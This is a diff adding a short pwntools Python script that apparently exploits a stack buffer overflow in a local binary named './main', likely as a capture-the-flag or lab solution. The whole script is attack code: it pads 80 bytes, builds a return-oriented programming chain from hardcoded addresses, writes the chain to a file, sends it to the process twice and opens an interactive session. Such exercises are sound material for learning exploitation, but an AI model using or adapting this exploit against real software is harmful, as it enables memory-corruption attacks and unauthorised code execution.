@@ -1,0 +1,16 @@
+from pwn import *
+exe = context.binary = ELF("./main")
+r = process()
+offset = 80
+rop = ROP(exe)
+rop.raw(b"A" * offset)
+rop.raw(0x40403d)
+rop.raw(0x000000000040119e)
+rop.raw(0x000000000040119e)
+rop.raw(0x000000000040119e)
+rop.raw(0x000000000040119e)
+write("p",rop.chain())
+sleep(3)
+r.sendline(rop.chain())
+r.sendline(rop.chain())
+r.interactive()
